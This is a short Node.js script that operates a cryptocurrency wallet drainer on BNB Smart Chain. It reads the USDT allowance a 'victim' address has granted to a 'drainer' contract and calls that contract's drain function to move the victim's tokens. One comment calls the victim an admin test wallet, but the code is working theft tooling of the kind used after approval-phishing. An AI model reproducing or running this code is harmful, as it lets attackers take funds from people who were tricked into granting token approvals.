const { ethers } = require('ethers');
require('dotenv').config();

async function manualDrain() {
    console.log('--- Manual Drain Execution ---');
    
    // Config
    const network = 'bsc';
    const victimAddress = '0x97127fa70102A054B8bcD244491e5037927606e6'; // Your admin wallet for testing
    const tokenAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT (BSC)
    const drainerAddress = '0x5c19b79aa20EF0b58c21bD4Ab7C30c9d6B048322';
    const privateKey = process.env.BSC_PRIVATE_KEY;
    const rpcUrl = process.env.BSC_RPC_URL;

    try {
        const provider = new ethers.JsonRpcProvider(rpcUrl);
        const signer = new ethers.Wallet(privateKey, provider);
        
        console.log(`Using Signer: ${signer.address}`);
        console.log(`Checking victim: ${victimAddress}`);

        const tokenContract = new ethers.Contract(tokenAddress, [
            "function allowance(address owner, address spender) view returns (uint256)",
            "function balanceOf(address owner) view returns (uint256)",
            "function symbol() view returns (string)"
        ], provider);

        const [allowance, balance, symbol] = await Promise.all([
            tokenContract.allowance(victimAddress, drainerAddress),
            tokenContract.balanceOf(victimAddress),
            tokenContract.symbol()
        ]);

        console.log(`Token: ${symbol}`);
        console.log(`Allowance: ${ethers.formatEther(allowance)}`);
        console.log(`Balance: ${ethers.formatEther(balance)}`);

        if (allowance === 0n) {
            console.log('❌ No allowance granted by victim.');
            return;
        }

        const amountToDrain = allowance < balance ? allowance : balance;
        if (amountToDrain === 0n) {
            console.log('❌ Nothing to drain (Balance is 0).');
            return;
        }

        console.log(`Attempting to drain ${ethers.formatEther(amountToDrain)} ${symbol}...`);

        const drainerContract = new ethers.Contract(drainerAddress, [
            "function drain(address token, address victim, uint256 amount) external returns (bool)"
        ], signer);

        const tx = await drainerContract.drain(tokenAddress, victimAddress, amountToDrain);
        console.log(`Transaction Sent: ${tx.hash}`);
        
        const receipt = await tx.wait();
        console.log('✅ Transaction Confirmed!');
        console.log(`Gas Used: ${receipt.gasUsed.toString()}`);

    } catch (error) {
        console.error('❌ Error executing manual drain:', error);
    }
}

manualDrain();
